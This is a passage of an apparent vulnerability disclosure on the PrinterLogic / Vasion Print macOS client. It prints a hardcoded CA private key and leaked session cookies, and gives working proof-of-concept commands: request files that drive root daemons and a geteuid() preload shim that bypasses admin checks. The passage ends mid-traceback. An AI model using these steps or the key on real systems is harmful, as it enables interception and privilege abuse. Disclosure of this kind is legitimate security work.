<p>Content of <code>/opt/PrinterInstallerClient/tmp/data/clientsettings.dat</code>:</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;result code="1"&gt;
  &lt;desc&gt;Successful&lt;/desc&gt;
  &lt;account_settings&gt;
    &lt;setting name="serverType"&gt;saas&lt;/setting&gt;
    &lt;setting name="admin_prot"&gt;Any (specified by url)&lt;/setting&gt;
    &lt;setting name="app_url"&gt;https://[redacted].printercloud10.com&lt;/setting&gt;
    &lt;setting name="badge_ad_object"/&gt;
    &lt;setting name="badge_password"&gt;SET&lt;/setting&gt;
</code></pre>
<p>It contains a custom Certificate Authority (CA) and its associated private key:</p>
<pre><code>    &lt;setting name="caCertificate"&gt;-----BEGIN CERTIFICATE-----
MIIF+DCCA+CgAwIBAgIBADANBgkqhkiG9w0BAQ0FADCBlDELMAkGA1UEBhMCVVMx
DTALBgNVBAgMBFV0YWgxEzARBgNVBAcMClN0LiBHZW9yZ2UxFTATBgNVBAoMDFBy
aW50ZXJMb2dpYzEZMBcGA1UECwwQUHJpbnRlckluc3RhbGxlcjEvMC0GA1UEAwwm
UHJpbnRlckluc3RhbGxlciBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMjEwNjA4
MDEwOTExWhcNNDEwNjAzMDEwOTExWjCBlDELMAkGA1UEBhMCVVMxDTALBgNVBAgM
BFV0YWgxEzARBgNVBAcMClN0LiBHZW9yZ2UxFTATBgNVBAoMDFByaW50ZXJMb2dp
YzEZMBcGA1UECwwQUHJpbnRlckluc3RhbGxlcjEvMC0GA1UEAwwmUHJpbnRlcklu
c3RhbGxlciBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwggIiMA0GCSqGSIb3DQEBAQUA
A4ICDwAwggIKAoICAQCs4uTY7wGVIs14OPZnEx33WwXg3b5aAEEw6uTiwgutiZoj
UoAJ7hytkEK7KDOB1TL7/IphKmtJdkixLgZYiLtRjzejOeQNPNbvROg/TtBADTal
Wp6d7j3Sr8a6yz0lwbMYgdpmu1M9kxAgc10PX2tbjcnGfP2LQ5eXofHkkyvGtCaE
o9RSs0DOLsIrK9Y6yctz+tKhYca0wPjIqp0IQBfHaCnskmqrWMlUU2PW9b3cIY96 
[...]
NmRZ843dZWEvh7Sa7uOqjXGbKgM209Y+z1qTGS5ge6+yE/08dswGx6lQLkgOGJjh
ocC5e+TosH3ISmcx/Y0rRYzKVOzW77v18ijozAKlG4usf/vPFaZD+72IaTM=
-----END CERTIFICATE-----
&lt;/setting&gt; 
[...]
    &lt;setting name="cac_filter"/&gt;
    &lt;setting name="cac_issuers"/&gt;
    &lt;setting name="cac_subjects"/&gt;
    &lt;setting name="caPrivateKey"&gt;-----BEGIN PRIVATE KEY-----
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQCs4uTY7wGVIs14
OPZnEx33WwXg3b5aAEEw6uTiwgutiZojUoAJ7hytkEK7KDOB1TL7/IphKmtJdkix
LgZYiLtRjzejOeQNPNbvROg/TtBADTalWp6d7j3Sr8a6yz0lwbMYgdpmu1M9kxAg
c10PX2tbjcnGfP2LQ5eXofHkkyvGtCaEo9RSs0DOLsIrK9Y6yctz+tKhYca0wPjI
qp0IQBfHaCnskmqrWMlUU2PW9b3cIY96qCI1qvlIYBJwm49tC6Wq84BlkNHmZ/Fz
7i56aAA6F9O46iODUrJvabwDs7N6MSuzoCatC4kciig85pr6jengpWbp3E6Z7ybo 
[...]
G3KOXALBOZOYykvJN1Q8v+dPmHE0qO4/t4Axz+NTtPbxd5k0AM9Lz7EfEspyrTau
+J0lD0I+7GdKk4dwUbmjCrfNDpAAs0l9rmLZ8gYKa9olnVJPB04TQBAwqR6ymwKj
LAECggEBANtxgXHp32BccvuzuNMd+Ep9RmfBHHSJTYSOlcdDh7U3j786JiYtLVxL
T87iC9gVwkKqi71aXMziWEMzN4JobtQyfLQ+T5kHFzBsU0L8wV/9JNkqzASsm0N7
ZhBMptDYB5TMgVy/KSALl1eyDi5z+YHe3tDU958c7OnkrhHu+qH6PMfLp3xziR6S
a6+mSov2DwmlJJ+y5MvYSXhh5kg0xbulg/kr8jWY0hfopQGAHT2eUmlMaS3ZCxIk
FqmTjGpNQnxLd+LS+YEKyjZsfs/5srqTzyVnn+D2TNeWpbinUESX3hQxXsdU5vDr
2lS4nryEiEh2058Cq6Z4zsBtsjNgtAg=
-----END PRIVATE KEY-----
</code></pre>
<p>It is possible to confirm this private key is the private key of the public CA by checking modulus - they have the same modulus value:</p>
<pre><code>kali% openssl rsa -noout -modulus -in CA.key 
Modulus=ACE2E4D8EF019522CD7838F667131DF75B05E0DDBE5A004130EAE4E2C20BAD899A23528009EE1CAD9042BB283381D532FBFC8A612A6B497648B12E065888BB518F37A339E40D3CD6EF44E83F4ED0400D36A55A9E9DEE3DD2AFC6BACB3D25C1B31881DA66BB533D931020735D0F5F6B5B8DC9C67CFD8B439797A1F1E4932BC6B42684A3D452B340CE2EC22B2BD63AC9CB73FAD2A161C6B4C0F8C8AA9D084017C76829EC926AAB58C9545363D6F5BDDC218F7AA82235AAF9486012709B8F6D0BA5AAF3806590D1E667F173EE2E7A68003A17D3B8EA238352B26F69BC03B3B37A312BB3A026AD0B891C8A283CE69AFA8DE9E0A566E9DC4E99EF26E887E7D7F2C786998BB440DD7F8A9009E4F6790F2F51A06ECD03AEA1FC46035B1BA72F43A8DF0EAC662DCB2F22E5E42BED8B04F7AF2D10EE97007499DE30A3A6225D61FB2856D3563D5E7855FFDA3DB8D599D064471F524E01DF2944F7BC70BC454F2F1CDA8CA0D5737A23E6280C25FCCAD5C1C439F5CE01CBE0348DC190508E73506EAF7060129B63661AF1AE2EA2E4F7695B3A66772A501F33FF13A2947600C8425BC1E7F1B3E664C84A9A284ADAA3352F5C0C6A07991800CDD0DA207497673FAFE046522B57F8C20AC3E14B98F25BA07B58650D0F9CEEA234A41CD268E9507E53BDAB9B46FF0DB39875E3C1AA719376AF6C240A8C99D13D8F525F2E7037523F12CB9855AFBB
kali% openssl x509 -noout -modulus -in CA.pem   
Modulus=ACE2E4D8EF019522CD7838F667131DF75B05E0DDBE5A004130EAE4E2C20BAD899A23528009EE1CAD9042BB283381D532FBFC8A612A6B497648B12E065888BB518F37A339E40D3CD6EF44E83F4ED0400D36A55A9E9DEE3DD2AFC6BACB3D25C1B31881DA66BB533D931020735D0F5F6B5B8DC9C67CFD8B439797A1F1E4932BC6B42684A3D452B340CE2EC22B2BD63AC9CB73FAD2A161C6B4C0F8C8AA9D084017C76829EC926AAB58C9545363D6F5BDDC218F7AA82235AAF9486012709B8F6D0BA5AAF3806590D1E667F173EE2E7A68003A17D3B8EA238352B26F69BC03B3B37A312BB3A026AD0B891C8A283CE69AFA8DE9E0A566E9DC4E99EF26E887E7D7F2C786998BB440DD7F8A9009E4F6790F2F51A06ECD03AEA1FC46035B1BA72F43A8DF0EAC662DCB2F22E5E42BED8B04F7AF2D10EE97007499DE30A3A6225D61FB2856D3563D5E7855FFDA3DB8D599D064471F524E01DF2944F7BC70BC454F2F1CDA8CA0D5737A23E6280C25FCCAD5C1C439F5CE01CBE0348DC190508E73506EAF7060129B63661AF1AE2EA2E4F7695B3A66772A501F33FF13A2947600C8425BC1E7F1B3E664C84A9A284ADAA3352F5C0C6A07991800CDD0DA207497673FAFE046522B57F8C20AC3E14B98F25BA07B58650D0F9CEEA234A41CD268E9507E53BDAB9B46FF0DB39875E3C1AA719376AF6C240A8C99D13D8F525F2E7037523F12CB9855AFBB
kali%
</code></pre>
<p>Description of the CA:</p>
<pre><code>kali% openssl x509 -in CA.pem -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 0 (0x0)
        Signature Algorithm: sha512WithRSAEncryption
        Issuer: C = US, ST = Utah, L = St. George, O = PrinterLogic, OU = PrinterInstaller, CN = PrinterInstaller Certificate Authority
        Validity
            Not Before: Jun  8 01:09:11 2021 GMT
            Not After : Jun  3 01:09:11 2041 GMT
        Subject: C = US, ST = Utah, L = St. George, O = PrinterLogic, OU = PrinterInstaller, CN = PrinterInstaller Certificate Authority
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (4096 bit)
                Modulus:
[...]
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                E7:D5:61:DF:25:55:26:00:96:89:09:0C:B1:E2:8F:35:AD:E7:1B:16
            X509v3 Authority Key Identifier: 
                keyid:E7:D5:61:DF:25:55:26:00:96:89:09:0C:B1:E2:8F:35:AD:E7:1B:16

            X509v3 Basic Constraints: 
                CA:TRUE, pathlen:0
    Signature Algorithm: sha512WithRSAEncryption
         33:d4:53:d0:d5:f0:08:45:b9:c3:3c:90:3c:17:da:af:84:74:
</code></pre>
<p>The program PrinterLogic may use this CA to transmit data securely.</p>
<p>It may allow an attacker to intercept data.</p>
<p><a id="mac-incorrect-permissions"></a></p>
<h2>Details - Incorrect permissions in /opt/PrinterInstallerClient/log</h2>
<p>By default, the printer runs several daemons as root:</p>
<pre><code>user@laptop ~ % ps -ef | grep Printer
    0   102     1   0  6:20PM ??         0:00.02 sh /opt/PrinterInstallerClient/service_interface/run_service.sh
    0   157   102   0  6:20PM ??         2:22.44 /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService
    0 55296   157   0  7:19PM ??         0:00.65 /opt/PrinterInstallerClient/service_interface/modules/PrinterLogicIdpAuthentication/PrinterLogicIdpAuthentication launch https://[redacted].printercloud10.com 0
    0 55974   157   0  7:22PM ??         0:00.16 /opt/PrinterInstallerClient/service_interface/PrinterInstallerClient.app/Contents/MacOS/PrinterInstallerClient login
user@laptop ~ %
</code></pre>
<p>These daemons will write logs in the directory <code>/opt/PrinterInstallerClient/log</code>.</p>
<p>The directory <code>/opt/PrinterInstallerClient/log</code> is <code>777</code>, allowing any user to add any file in this directory.</p>
<p>Listing of /opt/PrinterInstallerClient/log:</p>
<pre>
sh-3.2# pwd
/opt/PrinterInstallerClient/log
sh-3.2# ls -la
total 5976
<font color=red>drwxrwxrwt  11 root  wheel      352 Dec  7 17:37 .</font>
drwxr-xr-x  13 root  wheel      416 Dec  7 16:53 ..
-rw-r--r--   1 root  wheel       31 Dec  9 18:10 HOMEURL
-rw-r--r--   1 root  wheel   122847 Dec  9 17:39 PrinterLogicIdpAuthentication.log
-rw-r--r--   1 root  wheel     2068 Dec  7 16:53 install.log
<font color=red>-rw-rw-rwT   1 root  wheel    14141 Dec  9 17:39 interface.log</font>
-rw-r--r--   1 root  wheel     7927 Dec  9 17:36 launchd_service.log
-rw-r--r--   1 root  wheel    27012 Dec  8 15:04 launchd_service_error.log
-rw-r--r--   1 root  wheel  1177989 Dec  9 18:10 service.log
-rw-r--r--   1 root  wheel   657784 Dec  9 18:10 service_info.log
-rw-r--r--   1 root  wheel        2 Dec  9 17:36 service_last_exit
sh-3.2#
</pre>

<p>The file<code>interface.log</code> is open to everyone (<code>666</code>), allowing adding random logs or erasing the logs:</p>
<pre><code>user@laptop log % ls -la interface.log  
-rw-rw-rwT  1 root  wheel  23632 Dec  9 19:45 interface.log
user@laptop log % tail -n 2 interface.log
2021-12-09 19:42:44,952 (INFO): Done with command: PROGRESS
2021-12-09 19:45:42,164 (INFO): Done with command: UPLOAD_DRIVER
user@laptop log % echo &gt; interface.log
user@laptop log % ls -la interface.log
-rw-rw-rwT  1 root  wheel  1 Dec  9 20:22 interface.log
user@laptop log % tail -n 2 interface.log

user@laptop log %
</code></pre>
<p>Any user can retrieve the logs, write custom files inside the logs directory or corrupt the logs.</p>
<p><a id="mac-leak-secrets"></a></p>
<h2>Details - Leak of secrets inside the logs</h2>
<p>Because the logs are readable by any user, it is possible to extract clear-text authentication sessions using any local account.</p>
<p>As <code>executive</code> account. Sessions in clear-text in world-readable logs:</p>
<pre><code>executive@laptop log % grep SESS /opt/PrinterInstallerClient/log/*
/opt/PrinterInstallerClient/log/service_info.log:Arguments: https:,[redacted].printercloud10.com,/,PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;laravel_session=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;,printer,p972,,-1

executive@laptop log % cat /opt/PrinterInstallerClient/log/service_info.log | grep Argu
Arguments: https:,[redacted].printercloud10.com,/,PHPSESSID=c72968d6e68d781a800528758029b232;XSRF-TOKEN=eyJpdiI6IltyZWRhY3RlZF0iLCJ2YWx1ZSI6IltyZWRhY3RlZF0iLCJtYWMiOiJbcmVkYWN0ZWRdIn0=;,printer,p972,,-1
Arguments: ["05DC94A40DD482C8C2BF3CEBCB9D96AF1639050072", "8BC83598876FA522B58B928F082961861639049891", {}]
Arguments: ["4189DB18B395218DBF8F3CDA78C85B6B1639050252", "05DC94A40DD482C8C2BF3CEBCB9D96AF1639050072", {}]
Arguments: ["A3BF377328A91D1623C828D4628648BF1639050432", "4189DB18B395218DBF8F3CDA78C85B6B1639050252", {}]
Arguments: ["CB7C6C1E5C1CFD38E9C3447CA08033FD1639050612", "A3BF377328A91D1623C828D4628648BF1639050432", {}]
[...]
</code></pre>
<p>These sessions can be retrieved by anyone using the computer.</p>
<p>Any local user can retrieve the sessions and login into the SaaS version of Vasion Print / PrinterLogic.</p>
<p><a id="mac-lack-auth-communication"></a></p>
<h2>Details - Lack of authentication of the communication between services</h2>
<p>It was observed that communications between daemons are not protected, resulting in some interesting side effects. These inter-process communications are based on files.</p>
<p>By default, the programs use directories inside <code>/opt/PrinterInstallerClient/tmp</code> for inter-process communication. These directories are world-readable and world-writable:</p>
<p>Content of <code>/opt/PrinterInstallerClient/tmp</code>:</p>
<pre><code>executive@laptop tmp % pwd
/opt/PrinterInstallerClient/tmp
executive@laptop tmp % ls -la
total 0
drwxr-xr-x   9 root  wheel  288 Dec  7 16:53 .
drwxr-xr-x  13 root  wheel  416 Dec  9 20:20 ..
drwxrwxrwx   2 root  wheel   64 Dec  7 16:53 commands
drwxr-xr-x   2 root  wheel   64 Dec  7 16:53 crl
drwxr-xr-x  14 root  wheel  448 Dec  9 18:41 data
drwxrwxrwt   2 root  wheel   64 Dec  9 20:41 requests
drwxrwxrwt   3 root  wheel   96 Dec  9 18:40 responses
drwxrwxrwt   2 root  wheel   64 Dec  9 20:41 scratch
drwx------   2 root  wheel   64 Dec  9 19:29 state
executive@laptop tmp %
</code></pre>
<p>Any user can create a file inside <code>/opt/PrinterInstallerClient/tmp/requests/</code> to create a new communication with process running as root.</p>
<p>For example, any user can start a browser on the local user session by creating a file inside <code>/opt/PrinterInstallerClient/tmp</code>:</p>
<pre><code>executive@laptop responses % (echo "OPEN_HOME_URL" ; echo -n "?www.google.com" | base64) &gt; /opt/PrinterInstallerClient/tmp/requests/26TAjFzAlf-202112091901313
</code></pre>
<p>In the logs, we see a new task has been created:</p>
<pre><code>2021-12-09 20:53:45,882 (DEBUG): Processing request at '/opt/PrinterInstallerClient/tmp/requests/26TAjFzAlf-202112091901313'
2021-12-09 20:53:45,883 (INFO): Received request: OPEN_HOME_URL
2021-12-09 20:53:45,883 (INFO): Creating task:
Command: 'OPEN_HOME_URL'
Arguments: ?www.google.com
User ID: 503
Group ID: 20
Use UI: True
Origin: 'INTERFACE'
2021-12-09 20:53:45,894 (INFO): Done with request: OPEN_HOME_URL
</code></pre>
<p>This will result in a new Safari popup for the user <code>user</code> with the address: <code>https:/[redacted].printercloud10.com/?www.google.com</code></p>
<p>Browser started in the session of <code>user</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-mac-browser.png" /></p>
<p><a href="images/2025-vasion-report-0-mac-browser-full.png">Click here for full image</a></p>
<p>Executive user ID is <code>503</code> but the process will be created as <code>user</code> (user ID <code>501</code>) - meaning the security separation between users has been broken.</p>
<p>Any local user can create specific actions that will be executed on other local sessions.</p>
<p>The entire security model of inter-process communication is broken.</p>
<p><a id="mac-bypass-admin-ipc"></a></p>
<h2>Details - Bypass of admin commands using IPC</h2>
<p>By default, it is impossible to run some scripts to change the behavior of PrinterLogic. These scripts are located inside <code>/opt/PrinterInstallerClient/bin</code>.</p>
<p>Scripts inside <code>/opt/PrinterInstallerClient/bin</code>:</p>
<pre><code>user@laptop bin % pwd
/opt/PrinterInstallerClient/bin
user@laptop bin % ls -la
total 544
drwxr-xr-x  20 root  wheel     640 Dec  9 19:29 .
drwxr-xr-x  13 root  wheel     416 Dec  9 20:20 ..
-r--r--r--   1 root  wheel  204958 Dec  9 19:29 PrinterLogic-Debug-20211209192951.zip
-r-xr-x---   1 root  wheel     215 Mar  5  2021 ad_override_file.sh
-r-xr-x---   1 root  wheel     269 Mar  5  2021 bundle_debug.sh
-r-xr-x---   1 root  wheel     211 Mar  5  2021 configure_proxy.sh
-r-xr-x---   1 root  wheel     165 Mar  5  2021 disable_home_url_security.sh
-r-xr-x---   1 root  wheel     233 Mar  5  2021 disable_ipp_queue_interpretation.sh
-r-xr-x---   1 root  wheel     209 Mar  5  2021 disable_updates.sh
-r-xr-x---   1 root  wheel     243 Mar  5  2021 ignore_certificate_errors.sh
-r-xr-x---   1 root  wheel    3343 Mar  5  2021 install_fips_openssl.sh
-r-xr-x---   1 root  wheel     214 Mar  5  2021 kerberos_timeout.sh
-r-xr-x---   1 root  wheel     205 Mar  5  2021 lock_home_url.sh
-r-xr-x---   1 root  wheel     188 Mar  5  2021 refresh.sh
-r-xr-x---   1 root  wheel     725 Mar  5  2021 restart_service.sh
-r-xr-x---   1 root  wheel     197 Mar  5  2021 set_home_url.sh
-r-xr-x---   1 root  wheel     332 Mar  5  2021 toggle_debug_mode.sh
-r-xr-x---   1 root  wheel    1559 Mar  5  2021 uninstall.sh
-r-xr-x---   1 root  wheel     212 Mar  5  2021 use_authorization_code.sh
-r-xr-x---   1 root  wheel     210 Mar  5  2021 user_from_file.sh
user@laptop bin %
</code></pre>
<p>These scripts are not readable by normal user - only administrator users can read these scripts and it is impossible to execute these commands as normal user.</p>
<p>Content of <code>/opt/PrinterInstallerClient/bin/refresh.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>kali% cat refresh.sh 
<span style="color: #408080; font-style: italic">#!/bin/bash</span>

<span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Scheduling refresh&quot;</span>

<span style="color: #008000">set</span> -e

<span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Creating request&quot;</span>
<span style="color: #19177C">install_directory</span><span style="color: #666666">=</span><span style="color: #BA2121">`</span>cat /etc/pl_dir<span style="color: #BA2121">`</span>

<span style="color: #BA2121">&quot;</span><span style="color: #19177C">$install_directory</span><span style="color: #BA2121">/service_interface/./PrinterInstallerClientService&quot;</span> refresh
kali%
</pre></div>

<p>Executing manually the command found in the shell script will result in a failure:</p>
<pre><code>user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService refresh 
Having root/administrator privileges is required to run this command
user@laptop bin %
</code></pre>
<p>The executions of all the commands found in shell scripts inside <code>/opt/PrinterInstallerClient/bin</code> will be blocked:</p>
<pre><code>user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService configure_proxy  manual 192.168.100.1:8080
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService ad_override_file test
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService bundle_debug
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService disable_home_url_security true
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService disable_ipp_queue_interpretation true      
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService disable_updates true      
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService ignore_certificate_errors true
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService kerberos_timeout 10
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService lock_home_url --unlock
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService refresh
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService set_home_url http 192.168.100.1
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService toggle_debug_mode
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService uninstall
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService use_authorization_code 123
Having root/administrator privileges is required to run this command
user@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService user_from_file /etc/passwd
Having root/administrator privileges is required to run this command
</code></pre>
<p>These commands are blocked.</p>
<p>Some additional commands appear to exist.</p>
<p>Commands using the <code>PrinterInstallerClientService</code> binary:</p>
<pre><code>executive@laptop bin % /opt/PrinterInstallerClient/service_interface/./PrinterInstallerClientService ad_override_file disable_ipp_queue_interpretation true
usage: PrinterInstallerClientService [-h] {install,uninstall,preupgrade,bundle_debug,refresh,set_home_url,lock_home_url,disable_home_url_security,open_home_url,logout_idp_user,show_idp_authentication_app,open_print_job_management,show_secure_release_settings,use_authorization_code,disable_updates,user_from_file,ignore_certificate_errors,toggle_debug_mode,run_updater,disable_ipp_queue_interpretation,ad_override_file,samaccountname_override_file,configure_proxy,kerberos_timeout}
</code></pre>
<p>Using the Inter-process communication, it is possible to bypass these restrictions.</p>
<p>For example, <code>toggle_debug_mode</code> is blocked using command line but will work with IPC, even with a non-administrator account.</p>
<p>Enabling the debug mode as <code>user</code> user:</p>
<pre><code>user@laptop bin % echo -n 'TOGGLE_DEBUG_MODE'  &gt; /opt/PrinterInstallerClient/tmp/requests/0gAds9DkaG9934-20211210191900
</code></pre>
<p>The logs confirm the debug mode has been enabled:</p>
<pre><code>2021-12-09 21:25:24,164 (DEBUG): Processing request at '/opt/PrinterInstallerClient/tmp/requests/0gAds9DkaG9934-20211210191900'
2021-12-09 21:25:24,165 (INFO): Received request: TOGGLE_DEBUG_MODE
2021-12-09 21:25:24,165 (INFO): Creating task:
Command: 'TOGGLE_DEBUG_MODE'
Arguments: 
User ID: 501
Group ID: 20
Use UI: False
Origin: 'INTERNAL'
2021-12-09 21:25:24,167 (INFO): Turning on debug mode
2021-12-09 21:25:24,167 (INFO): Done with request: TOGGLE_DEBUG_MODE
2021-12-09 21:25:27,555 (INFO): CPU Usage since debug mode enabled (Top 50)
2021-12-09 21:25:27,557 (INFO):          3 function calls (5 primitive calls) in 0.000 seconds
</code></pre>
<p>The logs will then be filed with a lot of detailed information with entire stack traces:</p>
<pre><code>2021-12-09 21:25:27,559 (INFO): Open Files in PrinterInstallerClientService (157)
2021-12-09 21:25:27,561 (INFO): popenfile(path='/opt/PrinterInstallerClient/log/launchd_service.log', fd=1)
2021-12-09 21:25:27,562 (INFO): popenfile(path='/opt/PrinterInstallerClient/log/launchd_service_error.log', fd=2)
2021-12-09 21:25:27,563 (INFO): popenfile(path='/opt/PrinterInstallerClient/log/service.log', fd=3)
2021-12-09 21:25:27,565 (INFO): popenfile(path='/opt/PrinterInstallerClient/log/service_info.log', fd=4)
[...]
2021-12-09 21:25:27,648 (INFO): printer_installer/client/service/process/debug/cpu_monitor.py:28: size=387 B, count=7, average=55 B
2021-12-09 21:25:27,649 (INFO): /usr/local/python3.6/lib/python3.6/pstats.py:422: size=374 B, count=7, average=53 B
2021-12-09 21:25:27,651 (INFO): psutil/__init__.py:1280: size=371 B, count=7, average=53 B
2021-12-09 21:25:27,652 (INFO): /usr/local/python3.6/lib/python3.6/logging/__init__.py:809: size=348 B, count=7, average=50 B
2021-12-09 21:25:27,654 (INFO): /usr/local/python3.6/lib/python3.6/logging/__init__.py:802: size=348 B, count=7, average=50 B
2021-12-09 21:25:27,655 (INFO): /usr/local/python3.6/lib/python3.6/logging/__init__.py:822: size=347 B, count=7, average=50 B
2021-12-09 21:25:27,656 (INFO): yappi.py:195: size=346 B, count=5, average=69 B
[...]
2021-12-09 21:25:28,146 (INFO): &lt;RequestProcessor(Thread-185, started daemon 123145360580608)&gt;, id: 4427604880, ident: 123145360580608, stack: 
  File "/usr/local/python3.6/lib/python3.6/threading.py", line 884, in _bootstrap
  File "/usr/local/python3.6/lib/python3.6/threading.py", line 916, in _bootstrap_inner
  File "printer_installer/client/service/process/scheduler/request_processor.py", line 24, in run
  File "printer_installer/client/service/process/scheduler/request_processor.py", line 28, in _run_raises
  File "printer_installer/client/service/process/scheduler/request_processor.py", line 62, in _run
  File "printer_installer/client/service/process/scheduler/execute_tasks.py", line 12, in execute_tasks
  File "printer_installer/client/service/process/task/task.py", line 76, in call
  File "printer_installer/client/service/process/task/upload_driver.py", line 32, in _call
  File "printer_installer/client/service/connection/interface/upload_driver.py", line 17, in upload_driver
  File "printer_installer/client/service/connection/interface/upload_driver.py", line 23, in _run
  File "printer_installer/client/service/connection/interface/messenger.py", line 30, in read_message
</code></pre>
<p>The entire security model of inter-process communication is broken.</p>
<p><a id="mac-auth-bypass-printerinstallerclientservice"></a></p>
<h2>Details - Authentication bypass on the PrinterInstallerClientService program</h2>
<p>It is possible to perform administrative actions using <code>LD_PRELOAD</code> on <code>geteuid()</code>.</p>
<p>The program <code>/opt/PrinterInstallerClient/service_interface/PrinterInstallerClientService</code> requires root privileges:</p>
<pre><code>user@laptop /tmp % /opt/PrinterInstallerClient/service_interface/PrinterInstallerClientService bundle_debug
Having root/administrator privileges is required to run this command
</code></pre>
<p>Bypass using <code>LD_PRELOAD</code> on <code>geteuid()</code> (from <code>command.pyc</code>):</p>
<pre><code>user@laptop /tmp % cat /tmp/test2.c 
unsigned int geteuid() { return (0); }
user@laptop /tmp % gcc -shared -fPIC -o test2.so test2.c 
user@laptop /tmp % DYLD_INSERT_LIBRARIES=/tmp/test2.so DYLD_FORCE_FLAT_NAMESPACE=y /opt/PrinterInstallerClient/service_interface/PrinterInstallerClientService bundle_debug
</code></pre>
<p>And the bypass works, the <code>bundle_debug</code> mode has been enabled:</p>
<pre><code>2021-12-10 20:39:04,922 (DEBUG): Processing request at '/opt/PrinterInstallerClient/tmp/requests/0Zto9weDkF0zAfAD-20220119203904'
2021-12-10 20:39:04,923 (INFO): Received request: BUNDLE_DEBUG
2021-12-10 20:39:04,924 (INFO): Creating task:
Command: 'BUNDLE_DEBUG'
Arguments: 
User ID: 501
Group ID: 20
Use UI: False
Origin: 'INTERNAL'
2021-12-10 20:39:05,923 (DEBUG): Processing request at '/opt/PrinterInstallerClient/tmp/requests/00Zto9weDkF0zAfAD-20220119203904'
2021-12-10 20:39:05,924 (INFO): Received request: TOGGLE_DEBUG_MODE
2021-12-10 20:39:05,925 (INFO): Creating task:
Command: 'TOGGLE_DEBUG_MODE'
Arguments: 
User ID: 0
Group ID: 0
Use UI: False
Origin: 'INTERNAL'
2021-12-10 20:39:05,926 (INFO): Turning on debug mode
2021-12-10 20:39:05,926 (INFO): Done with request: TOGGLE_DEBUG_MODE
</code></pre>
<p>We can now perform some of the administrative actions:</p>
<pre><code>user@laptop ~ % DYLD_INSERT_LIBRARIES=/tmp/test2.so DYLD_FORCE_FLAT_NAMESPACE=y /opt/PrinterInstallerClient/service_interface/PrinterInstallerClientService --help
usage: PrinterInstallerClientService [-h]
                                     {install,uninstall,preupgrade,bundle_debug,refresh,set_home_url,lock_home_url,disable_home_url_security,open_home_url,logout_idp_user,show_idp_authentication_app,open_print_job_management,show_secure_release_settings,use_authorization_code,disable_updates,user_from_file,ignore_certificate_errors,toggle_debug_mode,run_updater,disable_ipp_queue_interpretation,ad_override_file,samaccountname_override_file,configure_proxy,kerberos_timeout}
                                     ...

positional arguments:
  {install,uninstall,preupgrade,bundle_debug,refresh,set_home_url,lock_home_url,disable_home_url_security,open_home_url,logout_idp_user,show_idp_authentication_app,open_print_job_management,show_secure_release_settings,use_authorization_code,disable_updates,user_from_file,ignore_certificate_errors,toggle_debug_mode,run_updater,disable_ipp_queue_interpretation,ad_override_file,samaccountname_override_file,configure_proxy,kerberos_timeout}

optional arguments:
  -h, --help            show this help message and exit
user@laptop ~ %
</code></pre>
<p>Some actions requiring write access to <code>/opt/PrinterInstallerClient/configuration.json</code> will fail:</p>
<pre><code>user@laptop service_interface % DYLD_INSERT_LIBRARIES=/tmp/test2.so DYLD_FORCE_FLAT_NAMESPACE=y ./PrinterInstallerClientService set_home_url http www2.google.com
Error trying to run command: 
Traceback (most recent call last):
  File "printer_installer/client/service/process/command.py", line 46, in handle
  File "printer_installer/client/service/process/command.py", line 170, in _handle
  File "/usr/local/python3.6/lib/python3.6/contextlib.py", line 82, in __enter__
  File "printer_installer/client/service/context.py", line 81, in configuration
  File "printer_installer/client/service/context.py", line 1015, in __enter__
  File "printer_installer/client/service/context.py", line 1027, in _load
PermissionError: [Errno 13] Permission denied: '/opt/PrinterInstallerClient/configuration.json'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "cx_Freeze/initscripts/__startup__.py", line 14, in run
  File "build-osx/init_script.py", line 38, in run
    exec(code, m.__dict__)
  File "printer_installer/client/service/main.py", line 166, in &lt;module&gt;
